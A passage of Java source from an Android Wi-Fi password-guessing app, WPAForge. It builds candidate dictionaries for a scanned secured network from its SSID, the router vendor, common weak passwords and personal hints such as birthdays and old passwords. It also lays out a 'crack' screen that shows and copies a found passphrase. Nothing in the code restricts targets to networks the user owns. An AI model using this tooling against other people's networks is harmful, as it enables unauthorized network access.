        m.birthday = bday.getText().toString().trim();
        m.houseNo = house.getText().toString().trim();
        m.landline = landline.getText().toString().trim();
        m.oldPassword = oldPw.getText().toString().trim();
        for (String c : splitComma(custom.getText().toString())) {
            io.github.wlmosv_png.wpaforge.audit.SeedModel.addCustom(m, c);
        }
        m.useSsid = useSsid;
        return m;
    }

    private static String ssidToggleLabel(boolean on) {
        return on
                ? L.s("SSID 派生：开（默认关，实测无贡献）", "SSID derivation: ON (off by default)")
                : L.s("SSID 派生：关（默认）", "SSID derivation: OFF (default)");
    }

    private static String joinComma(java.util.List<String> list) {
        if (list == null || list.isEmpty()) return "";
        return android.text.TextUtils.join(",", list);
    }

    /** 逗号 / 顿号 / 分号 / 空白都当分隔符 —— 国内输入法下这几种都会出现 */
    private static java.util.List<String> splitComma(String s) {
        java.util.List<String> out = new java.util.ArrayList<>();
        if (s == null) return out;
        for (String x : s.split("[,，、;；\\s]+")) {
            String v = x.trim();
            if (!v.isEmpty()) out.add(v);
        }
        return out;
    }

    /**
     * 按目标 SSID 现场派生候选。
     *
     * 先落盘再设为当前字典 —— 服务进程只认 dictPath，
     * 不落地会出现「候选显示正常但一跑就秒结束」。
     */
    private void deriveFromTarget() {
        if (targetNet == null) {
            Toast.makeText(this, L.s("请先选择目标网络",
                    "Select a target network first"), Toast.LENGTH_SHORT).show();
            return;
        }
        final String ssid = targetNet.ssid;
        // 线索在**点击那一刻**读一次并固定下来：线程里再读就可能与入队时不一致。
        // 取的是**本目标**的档案（没有就从默认模板继承，旧口令不继承）。
        final io.github.wlmosv_png.wpaforge.audit.SeedModel seeds = profileForCurrentTarget().seeds;
        final io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();
        appendStream(L.f("正在按 SSID「%s」生成定向载荷...",
                "Deriving candidates from SSID \"%s\"...", ssid));
        if (!seeds.isEmpty()) {
            appendStream(L.f("线索: %d 项（%s）", "Hints: %d item(s) (%s)",
                    seeds.count(), seeds.masked()));
        }
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.Result r =
                    io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.build(targetNet,
                            Prefs.deriveBudget(this),
                            io.github.wlmosv_png.wpaforge.scan.OuiLookup.vendor(this, targetNet.bssid),
                            seeds, io.github.wlmosv_png.wpaforge.audit.CnHot.load(this));
            // 文件名带线索指纹：换了线索再派生就不会撞上旧文件，
            // 服务端续跑也不会拿到错位的那一份
            // 落盘前剔掉本目标已试过的：这样落盘文件本身就不含重复，
            // 换字典/重跑时不会又把它们跑一遍（服务侧还会再兜一次底）。
            java.util.List<Candidate> fresh = new java.util.ArrayList<>(r.candidates.size());
            int skipped = 0;
            for (Candidate c : r.candidates) {
                if (tried.contains(c.password)) { skipped++; continue; }
                fresh.add(c);
            }
            // 名字要跟内容一致：这本现在主要是「画像 + 通用弱口令」，
            // 而 SSID 派生默认是关的，再叫「SSID 派生」会误导
            // 名字走 DerivedDicts：它同时负责「哪些是派生产物」的识别，
            // 名字规则一旦两处各写一遍，滚动清理就会认不出旧文件
            final String nm = io.github.wlmosv_png.wpaforge.audit.DerivedDicts
                    .targetedName(ssid, seeds.isEmpty() ? "" : seeds.fingerprint());
            final String path = saveDictToFile(fresh, nm);
            final int skipN = skipped;
            ui.post(() -> {
                applyDict(fresh, nm, path, SRC_PROFILE);
                appendStream(L.f("定向载荷就绪: %d 发", "Derived %d candidates", fresh.size()));
                if (skipN > 0) {
                    appendStream(L.f("已跳过 %d 条本目标试过的候选", "%d already tried, skipped", skipN));
                }
                appendStream(r.explanation);
            });
        }).start();
    }

    /** 内置生成器（通用词法），同样先落盘 */
    private void buildGenericDict() {
        appendStream(L.s("正在编排通用载荷...", "Building built-in dictionary..."));
        new Thread(() -> {
            io.github.wlmosv_png.wpaforge.audit.DictGenerator g =
                    io.github.wlmosv_png.wpaforge.audit.DictGenerator.quick(200000);
            final java.util.List<Candidate> list = g.build();
            final String nm = io.github.wlmosv_png.wpaforge.audit.DerivedDicts.generatorName();
            final String path = saveDictToFile(list, nm);
            final String stats = renderStats(g.stats());
            ui.post(() -> {
                applyDict(list, nm, path, SRC_GENERIC);
                appendStream(L.f("载荷编排完成: %d 发", "Generated %d entries", list.size()));
                appendStream(stats);
            });
        }).start();
    }

    /** 把 origin->count 渲染成一行可读文本 */
    private static String renderStats(java.util.Map<String, Integer> m) {
        if (m == null || m.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (java.util.Map.Entry<String, Integer> e : m.entrySet()) {
            if (sb.length() > 0) sb.append("  ·  ");
            sb.append(e.getKey()).append('=').append(e.getValue());
        }
        return sb.toString();
    }

    /**
     * 把候选写进 DictStore 目录，返回绝对路径。
     * 目录不可用或写入失败返回空串。
     */
    private String saveDictToFile(java.util.List<Candidate> list, String baseName) {
        if (list == null || list.isEmpty()) return "";
        File dir = io.github.wlmosv_png.wpaforge.audit.DictStore.defaultDir(this);
        if (dir == null) return "";
        if (!dir.exists() && !dir.mkdirs()) return "";
        String safe = baseName.replaceAll(FNAME_BAD, "_");
        purgeSameGroup(dir, safe + ".txt");
        File out = new File(dir, safe + ".txt");
        try (java.io.BufferedWriter w = new java.io.BufferedWriter(
                new java.io.OutputStreamWriter(new java.io.FileOutputStream(out), "UTF-8"))) {
            for (Candidate c : list) {
                w.write(c.password);
                w.write("\n");
            }
        } catch (Exception e) {
            android.util.Log.w("WPAForge", "saveDictToFile 失败: " + e);
            return "";
        }
        return out.getAbsolutePath();
    }

    /**
     * 写新的派生产物之前，删掉**同一个目标**的旧产物。
     *
     * <p>用户的原话：「那玩意用一次就不用了，留着看起来很多，还很麻烦」。
     * 与其每次生成都多一份，不如让每个目标最多只留最新一份 ——
     * 从「跑 N 次攒 2N 份」变成「恒定 2 份」。
     *
     * <p>队列里排队 / 正在跑 / 暂停中的任务引用的文件**一律不删**：
     * 那些路径一消失，续跑的 offset 就对不上了。
     */
    private void purgeSameGroup(File dir, String newFileName) {
        java.util.List<File> olds =
                io.github.wlmosv_png.wpaforge.audit.DerivedDicts.sameGroup(dir, newFileName);
        if (olds.isEmpty()) return;
        java.util.Set<String> keep;
        try {
            keep = io.github.wlmosv_png.wpaforge.audit.DerivedDicts.protectedPaths(
                    io.github.wlmosv_png.wpaforge.audit.TaskQueue.load(this));
        } catch (Throwable t) {
            keep = new java.util.HashSet<>();   // 读不到队列 → 保守：不清
            appendLog(L.s("队列读取失败，跳过旧派生清理", "Queue unreadable, skipping cleanup"));
            return;
        }
        int n = 0;
        for (File f : olds) {
            if (keep.contains(f.getAbsolutePath())) continue;
            if (f.delete()) n++;
        }
        if (n > 0) {
            appendLog(L.s("已清理 " + n + " 份同目标的旧派生字典",
                    "Removed " + n + " stale derived dictionary(ies)"));
        }
    }

    /** 统一入口：设为当前字典 + 刷新界面显示（来源代码见 SRC_*） */
    private void applyDict(java.util.List<Candidate> list, String name, String path) {
        applyDict(list, name, path, "");
    }

    private void applyDict(java.util.List<Candidate> list, String name, String path, String source) {
        currentDict = list;
        currentDictName = name;
        currentDictPath = path == null ? "" : path;
        currentDictSource = source == null ? "" : source;
        currentDictSkipped = countSkipped(list);
        updateDictStatus();
        updateConnectDict();
        Toast.makeText(this, L.f("已应用 %d 条", "Applied %d entries",
                list == null ? 0 : list.size()), Toast.LENGTH_SHORT).show();
    }

    /** 从字典文件里挑一个加载 */
    private void showDictPicker() {
        java.util.List<io.github.wlmosv_png.wpaforge.audit.DictStore.Entry> entries =
                io.github.wlmosv_png.wpaforge.audit.DictStore.scan(
                        io.github.wlmosv_png.wpaforge.audit.DictStore.defaultDir(this));
        if (entries.isEmpty()) {
            Toast.makeText(this, L.s("还没有字典，请先去字典管理里新建或导入", "No dictionaries yet. Create or import one in dictionary management."), Toast.LENGTH_LONG).show();
            return;
        }
        final String[] labels = new String[entries.size()];
        for (int i = 0; i < entries.size(); i++) {
            io.github.wlmosv_png.wpaforge.audit.DictStore.Entry e = entries.get(i);
            labels[i] = e.name + "   " + e.sizeLabel()
                    + (e.isRule ? L.s("  [规则]", "  [rule]") : "");
        }
        // 用系统 AlertDialog：NetDialog 在切 Tab 后偶发不显示（层级问题），
        // 系统弹窗永远在最上层，不会出现「点了没反应」。
        final io.github.wlmosv_png.wpaforge.audit.DictStore.Entry[] arr =
                entries.toArray(new io.github.wlmosv_png.wpaforge.audit.DictStore.Entry[0]);
        io.github.wlmosv_png.wpaforge.ui.NetDialog dlg =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.f("选择字典（共 %d 个）", "Pick a dictionary (%d)", entries.size()),
                        null);
        for (int i = 0; i < arr.length; i++) {
            final int idx = i;
            dlg.addItem(labels[i], dd -> loadDictFile(arr[idx]));
        }
        dlg.setNegative(L.s("取消", "Cancel"), null);
        dlg.show();
    }

    /**
     * 加载一个字典文件为当前字典。
     *
     * 两处刻意的选择：
     *
     * 1. **捕获 Throwable 而不是 Exception。**
     *    大字典（如 48 万行的号码变形表）读满上限时会造出几十万个
     *    Candidate 对象，ColorOS 上会抛 OutOfMemoryError。
     *    Error 不是 Exception，catch(Exception) 拦不住 —— 它会直接
     *    杀掉进程，用户看到的就是「选了字典就闪退」。
     *
     * 2. **上限 120000，且被截断时如实告知。**
     *    按实测约 1 秒/条，20 万条要跑 55 小时，本身就不可用。
     *    宁可明说「已截断」，也不要静默吃掉后半截。
     */
    private static final int DICT_LOAD_LIMIT = 120000;

    private void loadDictFile(io.github.wlmosv_png.wpaforge.audit.DictStore.Entry e) {
        appendLog(L.f("正在读取 %s ...", "Reading %s ...", e.name));
        new Thread(() -> {
            java.util.List<Candidate> list = null;
            String err = null;
            try {
                list = io.github.wlmosv_png.wpaforge.audit.DictStore.load(e, DICT_LOAD_LIMIT);
            } catch (Throwable t) {
                err = t.getClass().getSimpleName()
                        + (t.getMessage() == null ? "" : ": " + t.getMessage());
            }
            final java.util.List<Candidate> rl = list;
            final String re = err;
            ui.post(() -> {
                if (re != null) {
                    appendLog(L.f("读取失败: %s", "Failed to read: %s", re));
                    new android.app.AlertDialog.Builder(this)
                            .setTitle(L.s("字典太大，读不进来", "Dictionary too large"))
                            .setMessage(L.s(
                                    "这个字典超出本机可用内存。\n\n"
                                            + "建议改用内置的 TOP 榜（几百到几千条），\n"
                                            + "或先用「按目标派生」生成针对性候选 ——\n"
                                            + "几十条就覆盖最常见的场景，而且快得多。",
                                    "This dictionary exceeds available memory.\n\n"
                                            + "Use a built-in TOP list (hundreds to thousands)\n"
                                            + "or derive candidates from the SSID — a few dozen\n"
                                            + "entries cover the common cases and run far faster."))
                            .setPositiveButton(L.s("知道了", "Got it"), null)
                            .show();
                    return;
                }
                currentDict = rl;
                currentDictName = e.name;
                currentDictSource = SRC_FILE;
                currentDictPath = e.file.getAbsolutePath();
                currentDictSkipped = countSkipped(rl);
                updateDictStatus();
                updateConnectDict();
                appendLog("已加载 " + e.name + " -> " + rl.size() + L.s(" 条", " entries"));
                if (rl.size() >= DICT_LOAD_LIMIT) {
                    appendLog(L.f("注意: 已达上限 %d 条，后面的没读进来",
                            "Note: hit the %d limit — the rest was not loaded", DICT_LOAD_LIMIT));
                }
                if (rl.size() > 300) {
                    appendLog(L.f("提示: 约 %s 跑完（实测约 1 秒/条）",
                        "About %s to finish (~1s per attempt)", humanTime(rl.size())));
                }
            });
        }).start();
    }

    /**
     * 审计页的「按 SSID 派生」：先要一个目标。
     *
     * 已有目标（破解页选过）就直接用，否则让用户现场挑一个。
     * 挑完调 deriveFromTarget() —— 与破解页共用同一条实现，
     * 不复制逻辑，避免两边行为漂移。
     */
    private void pickTargetForDerive() {
        if (targetNet != null) {
            new android.app.AlertDialog.Builder(this)
                    .setTitle(L.s("按目标派生", "Derive from target"))
                    .setMessage(L.f("当前目标: %s\n\n直接用它派生，还是重新选一个？",
                            "Current target: %s\n\nUse it, or pick another?",
                            targetNet.displayName()))
                    .setPositiveButton(L.s("就用这个", "Use this"),
                            (d, w) -> deriveFromTarget())
                    .setNeutralButton(L.s("重新选", "Pick another"),
                            (d, w) -> chooseTargetThenDerive())
                    .setNegativeButton(L.s("取消", "Cancel"), null)
                    .show();
        } else {
            chooseTargetThenDerive();
        }
    }

    /** 选一个加密目标，选完立即派生 */
    private void chooseTargetThenDerive() {
        if (lastRecords.isEmpty()) {
            Toast.makeText(this, L.s("还没有扫描结果，请先去观测页",
                    "No scan results yet. Go to the Observe tab first."),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        List<String> labels = new ArrayList<>();
        final List<NetRecord> sel = new ArrayList<>();
        for (NetRecord r : lastRecords) {
            if (r.security == NetRecord.Security.OPEN) continue;
            labels.add(r.displayName() + "  (" + r.rssi + "dBm)");
            sel.add(r);
        }
        if (sel.isEmpty()) {
            Toast.makeText(this, L.s("扫描结果里没有加密网络",
                    "No secured networks in the scan results"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        final NetRecord[] arr = sel.toArray(new NetRecord[0]);
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("选择要派生的目标", "Pick a target to derive from"))
                .setItems(labels.toArray(new String[0]), (d, which) -> {
                    targetNet = arr[which];
                    Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);
                    updateTargetLabel();
                    refreshSkippedForCurrentDict();
                    deriveFromTarget();
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    private void appendLog(String line) {
        if (auditLog == null) return;
        if (!auditLogTouched) {
            auditLogTouched = true;
            auditLog.setTextColor(AmberTheme.TERM_FG);    // 有内容后回到终端正文色
            auditLog.setText("");                        // 清掉空状态占位
        }
        String cur = auditLog.getText().toString();
        String next = cur.isEmpty() ? line : cur + "\n" + line;
        String[] lines = next.split("\n");
        if (lines.length > 40) {
            StringBuilder sb = new StringBuilder();
            for (int i = lines.length - 40; i < lines.length; i++) {
                sb.append(lines[i]).append("\n");
            }
            next = sb.toString().trim();
        }
        auditLog.setText(next);
    }

    // ---------------- 试连页 ----------------

    /**
     * 破解页。
     *
     * 布局分三段：
     *   顶部  三行紧凑状态（目标 / 字典 / 执行方式）+ 进度条  —— 固定，不随滚动
     *   中部  候选流                                        —— 唯一可滚动区
     *   底部  开始 / 暂停 / 停止                              —— 固定，永远可见
     *
     * 这样做的原因：跑起来之后用户最常做的是「看进度」和「按停止」，
     * 这两个都不该需要先滚动才能看到。
     */
    /**
     * 破解页 —— Obsidian Amber 重构。
     *
     * <h3>结构（自上而下四张卡）</h3>
     * <pre>
     *   ① 网络信息卡   第一层 名称 + 安全类型胶囊；第二层 信号 · 信道 · 频段 · 执行通道
     *   ② 字典卡       名称 + 条数
     *   ③ 任务进度卡   当前状态（大字） + 完成度（超大数字） + 已完成/总数 + 进度条 + 速率/剩余
     *   ④ 状态与事件卡 当前候选（等宽大字） + 攻击流工具条 + 可滚动日志 + 空状态引导
     *   ⑤ 底部操作卡   开始（琥珀）/ 暂停（中性）/ 停止（克制红） + 可用性说明
     * </pre>
     *
     * <h3>约束</h3>
     * 所有字段名、点击回调、日志筛选语义、按钮回调**与改版前完全一致** ——
     * 这一版只重排布局、统一配色与尺寸，不碰任何业务逻辑。
     */
    private void buildConnectTab() {
        final float R = AmberTheme.RADIUS_CARD;

        // ================= ① 网络信息卡 =================
        LinearLayout netCard = AmberTheme.card(this, dp, R);

        LinearLayout netTop = new LinearLayout(this);
        netTop.setOrientation(LinearLayout.HORIZONTAL);
        netTop.setGravity(Gravity.CENTER_VERTICAL);

        connectTargetView = new TextView(this);
        connectTargetView.setTextSize(AmberTheme.FS_TITLE);
        connectTargetView.setTextColor(TEXT);
        connectTargetView.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        // 长网络名必须能截断：改版前它和 dBm/ch/安全类型挤在一行，
        // 名字一长就把右边的指标挤出屏幕。
        connectTargetView.setSingleLine(true);
        connectTargetView.setEllipsize(TextUtils.TruncateAt.END);
        connectTargetView.setOnClickListener(v -> showTargetPicker());
        netTop.addView(connectTargetView, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        netSecChip = new TextView(this);
        netSecChip.setTextSize(AmberTheme.FS_LABEL);
        netSecChip.setTextColor(ACCENT);
        netSecChip.setLetterSpacing(0.06f);
        netSecChip.setPadding(px(9), px(3), px(9), px(3));
        netSecChip.setBackground(roundBg(AmberTheme.ACCENT_BG, AmberTheme.RADIUS_CHIP));
        netSecChip.setVisibility(View.GONE);
        LinearLayout.LayoutParams secLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        secLp.leftMargin = px(10);
        netTop.addView(netSecChip, secLp);

        // 「?」说明入口：放在第一张卡的顶行最右 —— 那是视线的第一落点，
        // 又用弱灰小图标不抢主按钮的位置（它是"说明"，不是操作）。
        ImageView help = new ImageView(this);
        help.setImageDrawable(DictIcons.sized(DictIcons.Kind.HELP,
                AmberTheme.ACCENT, dp, 20f));
        help.setContentDescription(L.s("说明", "Help"));
        // 显式尺寸，不用 WRAP_CONTENT —— 上一版就是栽在这里：
        // DictIcons 没有 intrinsic size 时 ImageView 按 0 测量，图标只剩几个像素
        help.setPadding(px(9), px(9), px(9), px(9));
        help.setBackground(roundBg(AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
        LinearLayout.LayoutParams hlp = new LinearLayout.LayoutParams(px(38), px(38));
        hlp.leftMargin = px(8);
        help.setLayoutParams(hlp);
        help.setOnClickListener(v -> showCrackHelp());
        netTop.addView(help);

        netCard.addView(netTop);

        // 第二层：信号 · 信道 · 频段（等宽，数字能对齐）
        netMetaView = new TextView(this);
        netMetaView.setTextSize(AmberTheme.FS_BODY);
        netMetaView.setTextColor(AmberTheme.TEXT_DIM);
        netMetaView.setTypeface(Typeface.MONOSPACE);
        netMetaView.setSingleLine(true);
        netMetaView.setEllipsize(TextUtils.TruncateAt.END);
        LinearLayout.LayoutParams nmlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        nmlp.topMargin = px(7);
        netCard.addView(netMetaView, nmlp);

        // 第二层之二：执行通道 / 每次耗时（沿用 updateConnectMode 的既有实现）
        connectModeView = new TextView(this);
        connectModeView.setTextSize(AmberTheme.FS_BODY);
        connectModeView.setTextColor(TEXT_DIM);
        connectModeView.setSingleLine(false);
        connectModeView.setMaxLines(2);
        // 不可点：只有一种执行方式，点开弹「仅支持 Root」是噪音。
        connectModeView.setClickable(false);
        connectModeView.setFocusable(false);
        LinearLayout.LayoutParams cmlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cmlp.topMargin = px(4);
        netCard.addView(connectModeView, cmlp);

        pageConnect.addView(netCard, cardLp(0));

        // ================= ② 字典卡 =================
        LinearLayout dictCard = AmberTheme.card(this, dp, R);
        dictCard.addView(AmberTheme.label(this, L.s("字典", "DICTIONARY")));
        connectDictView = new TextView(this);
        connectDictView.setTextSize(AmberTheme.FS_STATE);
        connectDictView.setTextColor(TEXT_DIM);
        connectDictView.setSingleLine(true);
        connectDictView.setEllipsize(TextUtils.TruncateAt.END);
        connectDictView.setOnClickListener(v -> showDictSource());
        LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        dlp.topMargin = px(5);
        dictCard.addView(connectDictView, dlp);
        pageConnect.addView(dictCard, cardLp(AmberTheme.GAP_CARD));

        // 提示条（权限、通道错误等）—— 内容与显示时机完全由原逻辑控制
        observeNotice = new TextView(this);
        observeNotice.setTextSize(12);
        observeNotice.setTextColor(DANGER);
        observeNotice.setPadding(px(4), px(10), px(4), 0);
        observeNotice.setVisibility(View.GONE);
        pageConnect.addView(observeNotice);

        // ================= ③ 命中卡（命中时才显示） =================
        hitCard = new LinearLayout(this);
        hitCard.setOrientation(LinearLayout.VERTICAL);
        hitCard.setPadding(px(AmberTheme.PAD_H), px(AmberTheme.PAD_V),
                px(AmberTheme.PAD_H), px(AmberTheme.PAD_V));
        hitCard.setBackground(roundBgStatic(AmberTheme.OK_BG, R));
        hitCard.setVisibility(View.GONE);

        LinearLayout hitTop = new LinearLayout(this);
        hitTop.setOrientation(LinearLayout.HORIZONTAL);
        hitTop.setGravity(Gravity.CENTER_VERTICAL);
        TextView hitTitle = new TextView(this);
        hitTitle.setTextSize(13);
        hitTitle.setTextColor(OK_GREEN);
        hitTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        hitTop.addView(hitTitle, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        TextView hitCopy = new TextView(this);
        hitCopy.setText(L.s("复制", "Copy"));
        hitCopy.setTextSize(11.5f);
        hitCopy.setTextColor(ACCENT);
        hitCopy.setPadding(px(10), px(4), px(10), px(4));
        hitCopy.setBackground(roundBg(AmberTheme.ACCENT_BG, AmberTheme.RADIUS_CHIP));
        hitCopy.setClickable(true);
        hitCopy.setFocusable(true);
        hitCopy.setOnClickListener(v -> {
            String pw = hitPw == null ? "" : hitPw.getText().toString();
            if (pw.isEmpty()) return;
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    getSystemService(CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.setPrimaryClip(android.content.ClipData.newPlainText("WPAForge", pw));
                Toast.makeText(this, L.s("口令已复制", "Passphrase copied"),
                        Toast.LENGTH_SHORT).show();
            }
        });
        hitTop.addView(hitCopy);
        hitCard.addView(hitTop);
        hitCard.setTag(hitTitle);      // 标题文字在命中时才填（带 SSID）

        hitPw = new TextView(this);
        hitPw.setTextSize(26);
        hitPw.setTextColor(TEXT);
        hitPw.setTypeface(Typeface.MONOSPACE);
        hitPw.setPadding(0, px(6), 0, px(2));
        hitPw.setTextIsSelectable(true);
        hitCard.addView(hitPw);

        hitMeta = new TextView(this);
        hitMeta.setTextSize(11.5f);
        hitMeta.setTextColor(TEXT_DIM);
        hitCard.addView(hitMeta);

        pageConnect.addView(hitCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ④b 结算卡（跑完之后的结论）=================
        resultCard = AmberTheme.card(this, dp, R);
        resultCard.setVisibility(View.GONE);

        resultTitle = new TextView(this);
        resultTitle.setTextSize(AmberTheme.FS_STATE);
        resultTitle.setTextColor(TEXT);
        resultTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        resultCard.addView(resultTitle);

        resultSub = new TextView(this);
        resultSub.setTextSize(AmberTheme.FS_BODY);
        resultSub.setTextColor(TEXT_DIM);
        LinearLayout.LayoutParams rslp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rslp.topMargin = px(4);
        resultCard.addView(resultSub, rslp);

        resultWhy = new TextView(this);
        resultWhy.setTextSize(12.5f);
        resultWhy.setTextColor(AmberTheme.TEXT_DIM);
        resultWhy.setLineSpacing(px(4), 1f);
        LinearLayout.LayoutParams rwlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rwlp.topMargin = px(10);
        resultCard.addView(resultWhy, rwlp);

        resultActions = new LinearLayout(this);
        resultActions.setOrientation(LinearLayout.HORIZONTAL);
        resultActions.setPadding(0, px(12), 0, 0);
        resultCard.addView(resultActions);
        pageConnect.addView(resultCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ④ 任务进度卡 =================
        progressCard = AmberTheme.card(this, dp, R);

        LinearLayout progTop = new LinearLayout(this);
        progTop.setOrientation(LinearLayout.HORIZONTAL);
        progTop.setGravity(Gravity.BOTTOM);

        stateBig = new TextView(this);
        stateBig.setTextSize(AmberTheme.FS_STATE);
        stateBig.setTextColor(AmberTheme.TEXT_DIM);
        stateBig.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        stateBig.setSingleLine(true);
        stateBig.setEllipsize(TextUtils.TruncateAt.END);
        progTop.addView(stateBig, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        statPctView = new TextView(this);
        statPctView.setTextSize(AmberTheme.FS_HERO);
        statPctView.setTextColor(ACCENT);
        statPctView.setTypeface(Typeface.MONOSPACE);
        statPctView.setText("—");                 // 未就绪时是「—」，不编一个 0.0%
        statPctView.setTextColor(AmberTheme.TEXT_FAINT);   // 未知态弱色，有数才转琥珀
        progTop.addView(statPctView);
        progressCard.addView(progTop);

        LinearLayout statRow = new LinearLayout(this);
        statRow.setOrientation(LinearLayout.HORIZONTAL);
        statDoneView = AmberTheme.stat(this);
        statTotalView = AmberTheme.stat(this);
        statDoneView.setText("—");
        statTotalView.setText("—");
        // 未知态一律用弱色：30sp 的亮琥珀「—」看起来像一根进度条，容易被当成数据
        statDoneView.setTextColor(AmberTheme.TEXT_FAINT);
        statTotalView.setTextColor(AmberTheme.TEXT_FAINT);
        statRow.addView(AmberTheme.statColumn(this, dp, L.s("已完成", "TRIED"), statDoneView),
                weight());
        statRow.addView(AmberTheme.statColumn(this, dp, L.s("总数", "TOTAL"), statTotalView),
                weight());
        LinearLayout.LayoutParams srlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        srlp.topMargin = px(12);
        progressCard.addView(statRow, srlp);

        // 进度条沿用既有 StagedProgress（分层 / 流光 / 动画都在它里面），
        // 只把配色接到主题上，避免「页面主色」与「进度条主色」各写一个值。
        connectProgress = new io.github.wlmosv_png.wpaforge.ui.StagedProgress(this);
        connectProgress.setPalette(ACCENT, AmberTheme.ACCENT_DIM, AmberTheme.ACCENT_MID,
                TEXT, AmberTheme.TEXT_DIM, AmberTheme.CARD_2,
                OK_GREEN, AmberTheme.OK_DIM, AmberTheme.OK_MID);
        LinearLayout.LayoutParams plp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        plp.topMargin = px(14);
        connectProgress.setVisibility(View.GONE);
        progressCard.addView(connectProgress, plp);

        LinearLayout footRow = new LinearLayout(this);
        footRow.setOrientation(LinearLayout.HORIZONTAL);
        statRateView = new TextView(this);
        statRateView.setTextSize(AmberTheme.FS_BODY);
        statRateView.setTextColor(AmberTheme.TEXT_DIM);
        statEtaView = new TextView(this);
        statEtaView.setTextSize(AmberTheme.FS_BODY);
        statEtaView.setTextColor(AmberTheme.TEXT_DIM);
        statEtaView.setGravity(Gravity.END);
        statRateView.setText(L.s("速率 待测", "rate —"));
        statEtaView.setText(L.s("剩余 待估", "ETA —"));
        footRow.addView(statRateView, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        footRow.addView(statEtaView, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        LinearLayout.LayoutParams frlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        frlp.topMargin = px(10);
        progressCard.addView(footRow, frlp);

        finishNote = new TextView(this);
        finishNote.setTextSize(11.5f);
        finishNote.setTextColor(ACCENT);
        finishNote.setLineSpacing(px(3), 1f);
        finishNote.setVisibility(View.GONE);
        LinearLayout.LayoutParams fnlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        fnlp.topMargin = px(10);
        progressCard.addView(finishNote, fnlp);

        pageConnect.addView(progressCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ⑤ 状态与事件卡 =================
        eventCard = AmberTheme.card(this, dp, R);

        // 当前处理项（等宽大字 + 上两条）
        // 词汇改过：原来叫「当前候选」—— 跑完之后它还挂在那儿，
        // 会让用户以为"还在跑"。现在分两个词：
        //   运行中 = 正在尝试（主动语态）
        //   结束后 = 最后尝试（陈述事实，且**不说"完成"**——没找到不算完成）
        candLabel = AmberTheme.label(this, L.s("正在尝试", "TRYING"));
        candRoll = new io.github.wlmosv_png.wpaforge.ui.CandidateRoll(this);
        LinearLayout.LayoutParams candLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        candLp.topMargin = px(5);
        candRoll.setLayoutParams(candLp);
        candPrev = new TextView(this);
        candPrev.setTextSize(11.5f);
        candPrev.setTextColor(AmberTheme.TEXT_FAINT);
        candPrev.setTypeface(Typeface.MONOSPACE);
        candPrev.setLineSpacing(px(3), 1f);
        candPrev.setPadding(0, px(4), 0, 0);
        candPrev.setVisibility(View.GONE);
        candBox = new LinearLayout(this);
        candBox.setOrientation(LinearLayout.VERTICAL);
        candBox.setVisibility(View.GONE);
        candBox.addView(candLabel);
        candBox.addView(candRoll);
        candBox.addView(candPrev);
        eventCard.addView(candBox);

        // 攻击流工具条：折叠 / 级别筛选 / 清空（语义与回调不变）
        flowHeader = new LinearLayout(this);
        flowHeader.setOrientation(LinearLayout.HORIZONTAL);
        flowHeader.setGravity(Gravity.CENTER_VERTICAL);
        flowHeader.setPadding(0, px(12), 0, px(6));

        flowChevron = new TextView(this);
        flowChevron.setTextSize(11.5f);
        flowChevron.setTextColor(ACCENT);
        flowHeader.addView(flowChevron);

        flowLabel = new TextView(this);
        flowLabel.setTextSize(AmberTheme.FS_LABEL);
        flowLabel.setTextColor(TEXT_DIM);
        flowLabel.setLetterSpacing(0.12f);
